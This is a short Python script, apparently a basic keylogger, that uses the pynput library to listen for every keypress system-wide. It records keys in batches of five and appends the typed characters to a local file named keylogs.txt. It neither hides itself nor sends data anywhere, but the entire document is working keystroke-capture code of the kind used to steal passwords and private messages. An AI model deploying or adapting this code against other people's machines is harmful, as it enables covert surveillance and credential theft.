import pynput
from pynput.keyboard import Key,Listener
count=0
keys=[]

def press_var(key):
    global keys,count
    keys.append(str(key))
    count+=1
    print(f'{key} pressed')
    if count>=5:
        count=0
        update_file(keys)
        keys=[]             #reset the list 

def update_file(keys):
    with open("keylogs.txt","a") as f:
        for key in keys:
            print(key)
            k=str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find('Key') == -1:
                f.write(k)

with Listener(on_press=press_var) as listener:
    listener.join()
